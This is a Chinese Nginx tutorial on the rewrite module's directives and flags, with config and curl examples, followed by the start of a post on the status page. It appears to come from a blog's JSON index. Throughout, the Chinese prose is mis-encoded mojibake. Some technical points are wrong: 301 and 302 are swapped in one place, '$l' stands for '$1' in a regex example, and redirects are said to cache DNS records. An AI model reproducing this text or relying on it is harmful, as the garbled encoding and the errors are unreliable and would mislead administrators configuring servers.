æŒ‡ä»¤ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å¯¹å˜é‡è¿›è¡ŒåŒ¹é…ï¼ŒåŒ¹é…æˆåŠŸæ—¶ifæŒ‡ä»¤è®¤ä¸ºæ¡ä»¶ä¸ºtrueï¼Œå¦åˆ™è®¤ä¸ºfalseï¼Œæ”¯æŒä»¥ä¸‹æ¡ä»¶åˆ¤æ–­è¿ç®—ç¬¦ï¼š\n= #æ¯”è¾ƒå˜é‡å’Œå­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰ï¼Œç›¸ç­‰æ—¶ifæŒ‡ä»¤è®¤ä¸ºè¯¥æ¡ä»¶ä¸ºtrueï¼Œåä¹‹ä¸ºfalse != #æ¯”è¾ƒå˜é‡å’Œå­—ç¬¦ä¸²æ˜¯å¦ä¸ç›¸ç­‰ï¼Œä¸ç›¸ç­‰æ—¶ifæŒ‡ä»¤è®¤ä¸ºæ¡ä»¶ä¸ºtrueï¼Œåä¹‹ä¸ºfalse ~ #åŒºåˆ†å¤§å°å†™å­—ç¬¦ï¼Œå¯ä»¥é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ï¼Œæ»¡è¶³åŒ¹é…æ¡ä»¶ä¸ºçœŸï¼Œä¸æ»¡è¶³åŒ¹é…æ¡ä»¶ä¸ºå‡ !~ #åŒºåˆ†å¤§å°å†™å­—ç¬¦,åˆ¤æ–­æ˜¯å¦åŒ¹é…ï¼Œä¸æ»¡è¶³åŒ¹é…æ¡ä»¶ä¸ºçœŸï¼Œæ»¡è¶³åŒ¹é…æ¡ä»¶ä¸ºå‡ ~* #ä¸åŒºåˆ†å¤§å°å†™å­—ç¬¦ï¼Œå¯ä»¥é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ï¼Œæ»¡è¶³åŒ¹é…æ¡ä»¶ä¸ºçœŸï¼Œä¸æ»¡è¶³åŒ¹é…æ¡ä»¶ä¸ºå‡ !~* #ä¸åŒºåˆ†å¤§å°å­—ç¬¦,åˆ¤æ–­æ˜¯å¦åŒ¹é…ï¼Œæ»¡è¶³åŒ¹é…æ¡ä»¶ä¸ºå‡ï¼Œä¸æ»¡è¶³åŒ¹é…æ¡ä»¶ä¸ºçœŸ -f å’Œ !-f #åˆ¤æ–­è¯·æ±‚çš„æ–‡ä»¶æ˜¯å¦å­˜åœ¨å’Œæ˜¯å¦ä¸å­˜åœ¨ -d å’Œ !-d #åˆ¤æ–­è¯·æ±‚çš„ç›®å½•æ˜¯å¦å­˜åœ¨å’Œæ˜¯å¦ä¸å­˜åœ¨ -x å’Œ !-x #åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å¯æ‰§è¡Œå’Œæ˜¯å¦ä¸å¯æ‰§è¡Œ -e å’Œ !-e #åˆ¤æ–­è¯·æ±‚çš„æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦å­˜åœ¨å’Œæ˜¯å¦ä¸å­˜åœ¨(åŒ…æ‹¬æ–‡ä»¶ï¼Œç›®å½•ï¼Œè½¯é“¾æ¥) #æ³¨æ„ï¼š #å¦‚æœ$å˜é‡çš„å€¼ä¸ºç©ºå­—ç¬¦ä¸²æˆ–0ï¼Œåˆ™ifæŒ‡ä»¤è®¤ä¸ºè¯¥æ¡ä»¶ä¸ºfalseï¼Œå…¶ä»–æ¡ä»¶ä¸ºtrueã€‚ #nginx 1.0.1ä¹‹å‰$å˜é‡çš„å€¼å¦‚æœä»¥0å¼€å¤´çš„ä»»æ„å­—ç¬¦ä¸²ä¼šè¿”å›false #ç¤ºä¾‹ï¼š location /main { index index.html; default_type text/html; if ( $scheme = http ){ echo \u0026#34;if-----\u0026gt; $scheme\u0026#34;; } if ( $scheme = https ){ echo \u0026#34;if ----\u0026gt; $scheme\u0026#34;; } #if (-f $request_filename) { # echo \u0026#34;$request_filename is exist\u0026#34;; #} if (!-e $request_filename) { echo \u0026#34;$request_filename is not exist\u0026#34;; #return 409; } } set æŒ‡ä»¤ å¯ä»¥åˆ©ç”¨setæŒ‡å®šå®šä¹‰å˜é‡ï¼Œå˜é‡çš„å€¼ä¸ºå­—ç¬¦ä¸²ä¸”æ”¯æŒå­—ç¬¦ä¸²å’Œnginxå†…ç½®å˜é‡è¿›è¡Œå­—ç¬¦ä¸²æ‹¼æ¥ã€‚\nlocation /main { root /data/nginx/html/pc; index index.html; default_type text/html; set $name magedu; echo $name; set $my_port $server_port; echo $my_port; } break æŒ‡ä»¤ ç”¨äºä¸­æ–­å½“å‰ç›¸åŒä½œç”¨åŸŸ(location)ä¸­çš„å…¶ä»–NginxæŒ‡ä»¤ï¼Œä½äºbreakæŒ‡ä»¤åçš„å…¶ä»–æŒ‡ä»¤ä¸ä¼šæ‰§è¡Œã€‚\nlocation /main { root /data/nginx/html/pc; index index.html; default_type text/html; set $name magedu; echo $name; break; #locationå—ä¸­breakåé¢çš„å…¶ä»–ngx_http_rewrite_moduleæ¨¡å—æŒ‡ä»¤ä¸ä¼šæ‰§è¡Œï¼ˆå¦‚setæŒ‡ä»¤ï¼‰ set $my_port $server_port; echo $my_port; } return æŒ‡ä»¤ returnç”¨äºå®Œæˆå¯¹è¯·æ±‚çš„å¤„ç†ï¼Œå¹¶ç›´æ¥å‘å®¢æˆ·ç«¯è¿”å›å“åº”çŠ¶æ€ç ï¼Œæ¯”å¦‚:å¯ä»¥æŒ‡å®šé‡å®šå‘URL(å¯¹äºç‰¹æ®Šé‡å®šå‘çŠ¶æ€ç ï¼Œ301/302ç­‰) æˆ–è€…æ˜¯æŒ‡å®šæç¤ºæ–‡æœ¬å†…å®¹(å¯¹äºç‰¹æ®ŠçŠ¶æ€ç 403/500ç­‰)ï¼Œå¤„äºæ­¤æŒ‡ä»¤åçš„æ‰€æœ‰é…ç½®éƒ½å°†ä¸è¢«æ‰§è¡Œï¼Œreturnå¯ä»¥åœ¨serverã€if å’Œ locationå—è¿›è¡Œé…ç½®\nè¯­æ³•æ ¼å¼ï¼š\nreturn code; #è¿”å›ç»™å®¢æˆ·ç«¯æŒ‡å®šçš„HTTPçŠ¶æ€ç  return code [text]; #è¿”å›ç»™å®¢æˆ·ç«¯çš„çŠ¶æ€ç åŠå“åº”æŠ¥æ–‡çš„å®ä½“å†…å®¹ï¼Œå¯ä»¥è°ƒç”¨å˜é‡,å…¶ä¸­textå¦‚æœæœ‰ç©ºæ ¼,éœ€è¦ç”¨å•æˆ–åŒå¼•å·å¼•èµ·æ¥ return code URL; #è¿”å›ç»™å®¢æˆ·ç«¯çš„URLåœ°å€ èŒƒä¾‹ï¼š\nservice error[root@centos7 nginx]# cat conf.d/pc.conf server { listen 80; server_name pc.test.org; location / { root /app/nginx/html/pc; default_type text/html; index index.html; if ($scheme = http) { #return 666; #return 666 \u0026#34;not allow http\u0026#34;; #return 301 http://www.baidu.com; return 500 \u0026#34;service error\u0026#34;; echo \u0026#34;if ------\u0026gt; $scheme\u0026#34;; #return åé¢çš„æŒ‡ä»¤ä¸å†æ‰§è¡Œ } }\t} ##è®¿é—®æµ‹è¯• [root@centos7 nginx]# curl pc.test.org service error[root@centos7 nginx]# rewrite_log æŒ‡ä»¤ è®¾ç½®æ˜¯å¦å¼€å¯è®°å½•ngx_http_rewrite_module æ¨¡å—æ—¥å¿—è®°å½•åˆ° error_logæ—¥å¿—æ–‡ä»¶å½“ä¸­ï¼Œå¯ä»¥é…ç½®åœ¨httpã€serverã€location æˆ– if ä¸­\næ³¨æ„ï¼šå¼€å¯rewriteæ—¥å¿—éœ€è¦æå‰è®¾ç½®æ—¥å¿—çº§åˆ«ä¸ºnotice\n##å¼€å¯é”™è¯¯æ—¥å¿— [root@centos7 nginx]# cat /apps/nginx/conf/nginx.conf |grep error_log error_log logs/error.log notice; #å¼€å¯rewrite_log [root@centos7 nginx]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; location / { root /app/nginx/html/pc; default_type text/html; index index.html; set $name test; rewrite_log on; break; set $my_port $server_port; #ç”±äºåªç”¨äº†breakæŒ‡ä»¤ï¼Œæ•…setæŒ‡ä»¤ä¸ä¼šæ‰§è¡Œ echo $my_port; #echoæŒ‡ä»¤å°†æŠ¥é”™ }\t} #è®¿é—®æµ‹è¯• [root@centos7 nginx]# curl pc.test.org #æŸ¥çœ‹æ—¥å¿—è®°å½• [root@centos7 nginx]# tail -1 /apps/nginx/logs/error.log 2022/08/15 19:40:03 [warn] 1277#0: *7 using uninitialized \u0026#34;my_port\u0026#34; variable, client: 172.16.16.88, server: pc.test.org, request: \u0026#34;GET / HTTP/1.1\u0026#34;, host: \u0026#34;pc.test.org\u0026#34; rewrite æŒ‡ä»¤ é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼çš„åŒ¹é…æ¥æ”¹å˜URIï¼Œå¯ä»¥åŒæ—¶å­˜åœ¨ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡ä»¤ï¼ŒæŒ‰ç…§é¡ºåºä¾æ¬¡å¯¹URIè¿›è¡ŒåŒ¹é…ï¼Œrewriteä¸»è¦æ˜¯é’ˆå¯¹ç”¨æˆ·è¯·æ±‚çš„URLæˆ–è€…æ˜¯URIåšå…·ä½“å¤„ç†\nå®˜æ–¹æ–‡æ¡£ï¼šhttps://nginx.org/en/docs/http/ngx_http_rewrite_module.html#rewrite\nrewriteå¯ä»¥é…ç½®åœ¨ serverã€locationã€if å—ä¸­\nè¯­æ³•æ ¼å¼ï¼š\nrewrite regex replacement [flag]; rewriteå°†ç”¨æˆ·è¯·æ±‚çš„URIåŸºäºregexæ‰€æè¿°çš„æ¨¡å¼è¿›è¡Œæ£€æŸ¥ï¼ŒåŒ¹é…åˆ°æ—¶å°†å…¶æ›¿æ¢ä¸ºè¡¨è¾¾å¼æŒ‡å®šçš„æ–°çš„URI\næ³¨æ„ï¼šå¦‚æœåœ¨åŒä¸€çº§é…ç½®å—ä¸­å­˜åœ¨å¤šä¸ªrewriteè§„åˆ™ï¼Œé‚£ä¹ˆä¼šè‡ªä¸‹è€Œä¸‹é€ä¸ªæ£€æŸ¥; è¢«æŸæ¡ä»¶è§„åˆ™æ›¿æ¢å®Œæˆåï¼Œä¼šé‡æ–°è¿›è¡Œæ–°ä¸€è½®çš„æ›¿æ¢æ£€æŸ¥ï¼Œéšå«æœ‰å¾ªç¯æœºåˆ¶, ä½†ä¸è¶…è¿‡10æ¬¡; å¦‚æœè¶…è¿‡ï¼Œæç¤º500å“åº”ç ï¼Œ[flag]æ‰€è¡¨ç¤ºçš„æ ‡å¿—ä½ç”¨äºæ§åˆ¶æ­¤å¾ªç¯æœºåˆ¶\nå¦‚æœæ›¿æ¢åçš„URLæ˜¯ä»¥http://æˆ–https://å¼€å¤´ï¼Œåˆ™æ›¿æ¢ç»“æœä¼šç›´æ¥ä»¥é‡å®šå‘è¿”å›ç»™å®¢æˆ·ç«¯, å³æ°¸ä¹…é‡å®šå‘301\næ­£åˆ™è¡¨è¾¾å¼\n. #åŒ¹é…é™¤æ¢è¡Œç¬¦ä»¥å¤–çš„ä»»æ„å­—ç¬¦ \\w\t#åŒ¹é…å­—æ¯æˆ–æ•°å­—æˆ–ä¸‹åˆ’çº¿æˆ–æ±‰å­— \\s #åŒ¹é…ä»»æ„çš„ç©ºç™½ç¬¦ \\d #åŒ¹é…æ•°å­— \\b #åŒ¹é…å•è¯çš„å¼€å§‹æˆ–ç»“æŸ ^ #åŒ¹é…å­—ä»˜ä¸²çš„å¼€å§‹ $ #åŒ¹é…å­—ç¬¦ä¸²çš„ç»“æŸ * #åŒ¹é…é‡å¤é›¶æ¬¡æˆ–æ›´å¤šæ¬¡ + #åŒ¹é…é‡å¤ä¸€æ¬¡æˆ–æ›´å¤šæ¬¡ ? #åŒ¹é…é‡å¤é›¶æ¬¡æˆ–ä¸€æ¬¡ (n) #åŒ¹é…é‡å¤næ¬¡ {n,}\t#åŒ¹é…é‡å¤næ¬¡æˆ–æ›´å¤šæ¬¡ {n,m} #åŒ¹é…é‡å¤nåˆ°mæ¬¡ *? #åŒ¹é…é‡å¤ä»»æ„æ¬¡ï¼Œä½†å°½å¯èƒ½å°‘é‡å¤ +? #åŒ¹é…é‡å¤1æ¬¡æˆ–æ›´å¤šæ¬¡ï¼Œä½†å°½å¯èƒ½å°‘é‡å¤ ?? #åŒ¹é…é‡å¤0æ¬¡æˆ–1æ¬¡ï¼Œä½†å°½å¯èƒ½å°‘é‡å¤ {n,m}? #åŒ¹é…é‡å¤nåˆ°mæ¬¡ï¼Œä½†å°½å¯èƒ½å°‘é‡å¤ {n,}? #åŒ¹é…é‡å¤næ¬¡ä»¥ä¸Šï¼Œä½†å°½å¯èƒ½å°‘é‡å¤ \\W #åŒ¹é…ä»»æ„ä¸æ˜¯å­—æ¯ï¼Œæ•°å­—ï¼Œä¸‹åˆ’çº¿ï¼Œæ±‰å­—çš„å­—ç¬¦ \\S #åŒ¹é…ä»»æ„ä¸æ˜¯ç©ºç™½ç¬¦çš„å­—ç¬¦ \\D #åŒ¹é…ä»»æ„éæ•°å­—çš„å­—ç¬¦ \\B #åŒ¹é…ä¸æ˜¯å•è¯å¼€å¤´æˆ–ç»“æŸçš„ä½ç½® [^x] #åŒ¹é…é™¤äº†xä»¥å¤–çš„ä»»æ„å­—ç¬¦ [^magedu] #åŒ¹é…é™¤äº†magedu è¿™å‡ ä¸ªå­—æ¯ä»¥å¤–çš„ä»»æ„å­—ç¬¦ rewrite flag ä½¿ç”¨ä»‹ç» åˆ©ç”¨nginxçš„rewriteçš„æŒ‡ä»¤ï¼Œå¯ä»¥å®ç°urlçš„é‡æ–°è·³è½¬ï¼Œrewrtieæœ‰å››ç§ä¸åŒçš„flagï¼Œåˆ†åˆ«æ˜¯redirect(ä¸´æ—¶\né‡å®šå‘302)ã€permanent(æ°¸ä¹…é‡å®šå‘301)ã€breakå’Œlastã€‚å…¶ä¸­å‰ä¸¤ç§æ˜¯è·³è½¬å‹çš„flagï¼Œåä¸¤ç§æ˜¯ä»£ç†å‹\nè·³è½¬å‹æŒ‡ç”±å®¢æˆ·ç«¯æµè§ˆå™¨é‡æ–°å¯¹æ–°åœ°å€è¿›è¡Œè¯·æ±‚ ä»£ç†å‹æ˜¯åœ¨WEBæœåŠ¡å™¨å†…éƒ¨å®ç°è·³è½¬ rewrite æ ¼å¼\nSyntax: rewrite regex replacement [flag]; #é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼å¤„ç†ç”¨æˆ·è¯·æ±‚å¹¶è¿”å›æ›¿æ¢åçš„æ•°æ®åŒ…ã€‚ Default: â€” Context: server, location, if flag è¯´æ˜\nredirect; #ä¸´æ—¶é‡å®šå‘ï¼Œé‡å†™å®Œæˆåä»¥ä¸´æ—¶é‡å®šå‘æ–¹å¼ç›´æ¥è¿”å›é‡å†™åç”Ÿæˆçš„æ–°URLç»™å®¢æˆ·ç«¯ï¼Œç”±å®¢æˆ·ç«¯é‡æ–°å‘èµ·è¯·æ±‚;ä½¿ç”¨ç›¸å¯¹è·¯å¾„,æˆ–è€…http://æˆ–https://å¼€å¤´ï¼ŒçŠ¶æ€ç ï¼š302 permanent; #é‡å†™å®Œæˆåä»¥æ°¸ä¹…é‡å®šå‘æ–¹å¼ç›´æ¥è¿”å›é‡å†™åç”Ÿæˆçš„æ–°URLç»™å®¢æˆ·ç«¯ï¼Œç”±å®¢æˆ·ç«¯é‡æ–°å‘èµ·è¯·æ±‚ï¼ŒçŠ¶æ€ç ï¼š301 break; #é‡å†™å®Œæˆå,åœæ­¢å¯¹å½“å‰URLåœ¨å½“å‰locationä¸­åç»­çš„å…¶å®ƒé‡å†™æ“ä½œï¼Œè€Œåç›´æ¥è·³è½¬è‡³é‡å†™è§„åˆ™é…ç½®å—ä¹‹åçš„å…¶å®ƒé…ç½®;ç»“æŸå¾ªç¯ï¼Œå»ºè®®åœ¨locationä¸­ä½¿ç”¨ #é€‚ç”¨äºä¸€ä¸ªURLä¸€æ¬¡é‡å†™ last; #é‡å†™å®Œæˆå,åœæ­¢å¯¹å½“å‰URIåœ¨å½“å‰locationä¸­åç»­çš„å…¶å®ƒé‡å†™æ“ä½œï¼Œè€Œåå¯¹æ–°çš„URLå¯åŠ¨æ–°ä¸€è½®é‡å†™æ£€æŸ¥ï¼Œä¸å»ºè®®åœ¨locationä¸­ä½¿ç”¨ #é€‚ç”¨äºä¸€ä¸ªURLå¤šæ¬¡é‡å†™ï¼Œè¦æ³¨æ„é¿å…å‡ºç°è¶…è¿‡åæ¬¡ä»¥åŠURLé‡å†™åè¿”å›é”™è¯¯çš„ç»™ç”¨æˆ· rewrite æ¡ˆä¾‹ï¼šåŸŸåé‡å®šå‘ é‡å®šå‘åˆ†ä¸ºä¸´æ—¶é‡å®šå‘ï¼ˆ301ï¼‰å’Œæ°¸ä¹…é‡å®šå‘ï¼ˆ302ï¼‰ï¼Œä¸´æ—¶é‡å®šå‘ä¸ä¼šç¼“å­˜åŸŸåè§£æè®°å½•(Aè®°å½•)ï¼Œä½†æ˜¯æ°¸ä¹…é‡å®šå‘ä¼šç¼“å­˜ã€‚\nç¤ºä¾‹ï¼šå› ä¸šåŠ¡éœ€è¦ï¼Œéœ€å°†è®¿é—®æºåŸŸåpc.test.com çš„è¯·æ±‚é‡å®šå‘åˆ°mobile.test.com\n##å‡†å¤‡ä¸¤ä¸ªç«™ç‚¹ [root@centos7 nginx]# curl pc.test.com pc_page [root@centos7 nginx]# curl mobile.test.com mobile_page ##é…ç½®è·³è½¬è§„åˆ™ [root@centos7 nginx]# cat conf.d/pc.conf server { listen 80; server_name pc.test.com; location / { root /apps/nginx/html/pc; default_type text/html; index index.html; #rewrite / http://mobile.test.com; #è·³è½¬è‡³mobile.test.com }\t} #æµ‹è¯•è·³è½¬ [root@centos7 nginx]# curl pc.test.com -L mobile_page æ°¸ä¹…é‡å®šå‘ 301 åŸŸåæ°¸ä¹…å‹è°ƒæ•´ï¼Œå³åŸŸåæ°¸è¿œè·³è½¬è‡³å¦å¤–ä¸€ä¸ªæ–°çš„åŸŸåï¼Œä¹‹å‰çš„åŸŸåå†ä¹Ÿä¸ä½¿ç”¨ï¼Œè·³è½¬è®°å½•å¯ä»¥ç¼“å­˜åˆ°\nå®¢æˆ·ç«¯æµè§ˆå™¨\næ°¸ä¹…é‡å®šå‘ä¼šç¼“å­˜DNSè§£æè®°å½•, æµè§ˆå™¨ä¸­æœ‰ from disk cache ä¿¡æ¯\nç¤ºä¾‹ï¼šè®¿é—®www.360buy.com (äº¬ä¸œæ—©æœŸåŸŸåï¼‰å°†æ°¸ä¹…è·³è½¬è‡³ www.jd.com ï¼ˆç£ç›˜ç¼“å­˜è¯¥è·³è½¬ä¿¡æ¯ï¼‰\nä¸´æ—¶é‡å®šå‘ 302 åŸŸåä¸´æ—¶é‡å®šå‘ï¼Œå‘Šè¯‰æµè§ˆå™¨åŸŸåä¸æ˜¯å›ºå®šé‡å®šå‘åˆ°å½“å‰ç›®æ ‡åŸŸåï¼ŒåæœŸå¯èƒ½éšæ—¶ä¼šæ›´æ”¹ï¼Œå› æ­¤æµè§ˆå™¨\nä¸ä¼šç¼“å­˜å½“å‰åŸŸåçš„è§£æè®°å½•ï¼Œè€Œæµè§ˆå™¨ä¼šç¼“å­˜æ°¸ä¹…é‡å®šå‘çš„DNSè§£æè®°å½•ï¼Œè¿™ä¹Ÿæ˜¯ä¸´æ—¶é‡å®šå‘ä¸æ°¸ä¹…\né‡å®šå‘æœ€å¤§çš„æœ¬è´¨åŒºåˆ«ã€‚\nrewrite æ¡ˆä¾‹ï¼šbreakä¸last break æ¡ˆä¾‹ [root@centos7 conf.d]# cat pc.conf server { listen 80; server_name pc.test.com; location /break { root html; index index.html; rewrite ^/break/(.*) /test/$1 break; #é‡å†™URLåï¼Œç›´æ¥è¿”å›ç›¸åº”çš„è¯·æ±‚ç»“æœ } location /test { return 666 \u0026#34;====end====\u0026#34;; } } [root@centos7 conf.d]# curl pc.test.com/break/ ====end====[root@centos7 conf.d]# #è®¿é—®/break/** ï¼Œè¢«é‡å†™ä¸º/test/**ï¼Œä½†æ˜¯é‡å†™åçš„è·¯å¾„å¹¶ä¸å­˜åœ¨ï¼ŒæŠ¥é”™404 [root@centos7 conf.d]# curl pc.test.com/break/** \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;404 Not Found\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;404 Not Found\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;center\u0026gt;nginx/1.18.0\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; last æ¡ˆä¾‹ [root@centos7 conf.d]# cat pc.conf server { listen 80; server_name pc.test.com; location /break { root html; index index.html; rewrite ^/break/(.*) /test/$1 last; #é‡å†™è¯·æ±‚URLåï¼Œé‡æ–°å‘èµ·è¯·æ±‚åŒ¹é…location } location /test { return 666 \u0026#34;====end====\u0026#34;; } } [root@centos7 conf.d]# curl pc.test.com/break/ ====end====[root@centos7 conf.d]# #è®¿é—®/break/**, è¢«é‡å†™ä¸º/test/** , é‡æ–°å‘èµ·æ–°çš„åŒ¹é…è¯·æ±‚ï¼ŒåŒ¹é…åˆ°/testï¼Œè¿”å›ç›¸åº”ç»“æœ [root@centos7 conf.d]# curl pc.test.com/break/** ====end====[root@centos7 conf.d]# rewrite æ¡ˆä¾‹ï¼šè‡ªåŠ¨è·³è½¬https [root@centos7 conf.d]# cat pc.conf server { listen 80; listen 443 ssl; server_name pc.test.com; ssl_certificate /apps/nginx/certs/www.nginx.com.pem; ssl_certificate_key /apps/nginx/certs/www.nginx.com.key; ssl_session_cache shared:sslcache:20m; ssl_session_timeout 10m; location / { #é…ç½®å…¨ç«™https root html/pc; index index.html; if ($scheme = http) { # rewrite / https://$host redirect; } } location /login { #é…ç½®éƒ¨åˆ†ç«™ç‚¹httpsåŠ å¯†ï¼Œå¦‚ç™»å½•ç•Œé¢ if ($scheme = http) { rewrite / https://$host/login redirect; } } } #è®¿é—®æµ‹è¯•ï¼ŒæˆåŠŸ [root@centos7 conf.d]# curl -ikL pc.test.com HTTP/1.1 302 Moved Temporarily Server: nginx/1.18.0 Date: Mon, 15 Aug 2022 17:43:20 GMT Content-Type: text/html Content-Length: 145 Connection: keep-alive Keep-Alive: timeout=60 Location: https://pc.test.com HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Mon, 15 Aug 2022 17:43:20 GMT Content-Type: text/html Content-Length: 8 Last-Modified: Mon, 15 Aug 2022 12:24:47 GMT Connection: keep-alive Keep-Alive: timeout=60 ETag: \u0026#34;62fa3b0f-8\u0026#34; Accept-Ranges: bytes pc_page rewrite æ¡ˆä¾‹ï¼š é‡å®šå‘é”™è¯¯é¡µé¢åˆ°ä¸»é¡µ æ¡ˆä¾‹ï¼šå½“ç”¨æˆ·è®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„URLæ—¶ï¼Œå°†é¡µé¢é‡å®šå‘è‡³ç«™ç‚¹é¦–é¡µ\n[root@centos7 conf.d]# cat pc.conf server { listen 80; server_name pc.test.com; location / { root html/pc; index index.html; if ( !-e $request_filename ) { #é…ç½®è·³è½¬è§„åˆ™ rewrite .* http://$host; } } } #è®¿é—®ä¸å­˜åœ¨çš„é¡µé¢æµ‹è¯• [root@centos7 conf.d]# curl pc.test.com/** -L pc_page [root@centos7 conf.d]# curl pc.test.com/kk -L pc_page å…¶ä»–åº”ç”¨æ¡ˆä¾‹ #æ¡ˆä¾‹1:å¦‚æœå®¢æˆ·ç«¯æµè§ˆå™¨åŒ…å«MSIEï¼Œåˆ™rewriteå®¢æˆ·ç«¯è¯·æ±‚åˆ°/msieç›®å½•ä¸‹ if ( $http_user_agent ~ MSIE){ rewrite ^(.*)$ /msie/$1 break; } #æ¡ˆä¾‹2: æ›´æ¢ç›®å½•è®¿é—®æ–¹å¼, ç›®å½•è½¬æ¢ä¸ºå¯¹è±¡å­˜å‚¨å½¢å¼ #è¦æ±‚: #/20200106/static -\u0026gt;/static?id=20200106 #/20200123/image -\u0026gt;/image?id=20200123 rewrite ^/(\\d+)/(.+)/ /$2?id=$l last; #æ¡ˆä¾‹3:å¤šç›®å½•è½¬æ¢è®¿é—®æ–¹å¼ #è¦æ±‚: www.magedu.com/images/20200106/1.jpg =\u0026gt; www.magedu.com/index.do?name=images\u0026amp;dir=20200106=\u0026amp;file=1.jpg #è§„åˆ™é…ç½®: if ($host ~* (.*)\\.magedu\\.com) { rewrite ^/(.*)/(\\d+)/(.*)$ /index.do?name=$1\u0026amp;dir=$2\u0026amp;file=$3 last; } ","permalink":"https://senmer.github.io/zh/posts/tech/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/","summary":"\u003cp\u003eNginxå®ç°ç½‘å€é‡å®šå‘\u003c/p\u003e","title":"Nginxå®ç°rewriteåŠŸèƒ½"},{"content":"Nginx é«˜çº§é…ç½®åŠç¬¬ä¸‰æ–¹æ¨¡å—\nNginx çŠ¶æ€é¡µ åŸºäºnginx æ¨¡å— ngx_http_stub_status_module å®ç°ï¼Œåœ¨ç¼–è¯‘å®‰è£…nginxçš„æ—¶å€™éœ€è¦æ·»åŠ ç¼–è¯‘å‚æ•° \u0026ndash;with-http_stub_status_module\næ³¨æ„ï¼šçŠ¶æ€é¡µæ˜¾ç¤ºçš„æ˜¯æ•´ä¸ªæœåŠ¡å™¨çš„çŠ¶æ€ï¼Œè€Œéè™šæ‹Ÿä¸»æœºçš„çŠ¶æ€\né…ç½®ç¤ºä¾‹\n[root@centos7 conf.d]# nginx -V #æŸ¥çœ‹nginxç¼–è¯‘å‚æ•°ï¼Œç¡®å®šæ·»åŠ äº†ngx_http_stub_status_moduleæ¨¡å— nginx version: nginx/1.18.0 built by gcc 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) built with OpenSSL 1.0.2k-fips 26 Jan 2017 TLS SNI support enabled configure arguments: --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module [root@centos7 conf.d]# pwd /apps/nginx/conf.d [root@centos7 conf.d]# cat pc.conf #ç¼–è¾‘è™šæ‹Ÿä¸»æœºï¼Œæ·»åŠ çŠ¶æ€é¡µé…ç½® server { listen 80 default_server; server_name pc.test.org; location /nginx_status { #çŠ¶æ€é¡µuriåŒ¹é…è§„åˆ™ stub_status; } } ##è®¿é—®æµ‹è¯• [root@centos7 conf.d]# curl pc.test.org/nginx_status/ Active connections: 1 server accepts handled requests 11 11 15 #åˆ†åˆ«å¯¹åº”accepts,handled,requestsä¸‰ä¸ªå­—æ®µ Reading: 0 Writing: 1 Waiting: 0 ##å‚æ•°è§£é‡Š Active connectionsï¼š #å½“å‰å¤„äºæ´»åŠ¨çŠ¶æ€çš„å®¢æˆ·ç«¯è¿æ¥æ•°ï¼ˆ=reading+writing+waitingï¼‰ acceptsï¼š#ç»Ÿè®¡æ€»å€¼ï¼ŒNginxè‡ªå¯åŠ¨åå·²ç»æ¥å—çš„å®¢æˆ·ç«¯è¯·æ±‚è¿æ¥çš„æ€»æ•°ã€‚ handledï¼š#ç»Ÿè®¡æ€»å€¼ï¼ŒNginxè‡ªå¯åŠ¨åå·²ç»å¤„ç†å®Œæˆçš„å®¢æˆ·ç«¯è¯·æ±‚è¿æ¥æ€»æ•°ï¼Œé€šå¸¸ç­‰äºacceptsï¼Œé™¤éæœ‰å› ä¸ºworker_connectionsé™åˆ¶ç­‰è¢«æ‹’ç»çš„è¿æ¥ requestsï¼š#ç»Ÿè®¡æ€»å€¼ï¼ŒNginxè‡ªå¯åŠ¨åå®¢æˆ·ç«¯å‘æ¥çš„æ€»çš„è¯·æ±‚æ•°ï¼ˆå•æ¬¡è¿æ¥å¯èƒ½å‘ç”Ÿå¤šæ¬¡è¯·æ±‚ï¼‰ã€‚ Readingï¼š#å½“å‰çŠ¶æ€ï¼Œæ­£åœ¨è¯»å–å®¢æˆ·ç«¯è¯·æ±‚æŠ¥æ–‡é¦–éƒ¨çš„è¿æ¥çš„è¿æ¥æ•°,æ•°å€¼è¶Šå¤§,è¯´æ˜æ’é˜Ÿç°è±¡ä¸¥é‡,æ€§èƒ½ä¸è¶³ Writingï¼š#å½“å‰çŠ¶æ€ï¼Œæ­£åœ¨å‘å®¢æˆ·ç«¯å‘é€å“åº”æŠ¥æ–‡è¿‡ç¨‹ä¸­çš„è¿æ¥æ•°,æ•°å€¼è¶Šå¤§,è¯´æ˜è®¿é—®é‡å¾ˆå¤§ Waitingï¼š#å½“å‰çŠ¶æ€ï¼Œæ­£åœ¨ç­‰å¾…å®¢æˆ·ç«¯å‘å‡ºè¯·æ±‚çš„ç©ºé—²è¿æ¥æ•°ï¼Œå¼€å¯ keep-aliveçš„æƒ…å†µä¸‹,è¿™ä¸ªå€¼ç­‰äºactive â€“ (reading+writing) Nginx ç¬¬ä¸‰æ–¹æ¨¡å— ç¬¬ä¸‰æ–¹æ¨¡å—æ˜¯å¯¹nginx çš„åŠŸèƒ½æ‰©å±•ï¼Œç¬¬ä¸‰æ–¹æ¨¡å—éœ€è¦åœ¨ç¼–è¯‘å®‰è£…nginxçš„æ—¶å€™ä½¿ç”¨å‚æ•°\u0026ndash;add-module=PATHæŒ‡å®šè·¯å¾„æ·»åŠ 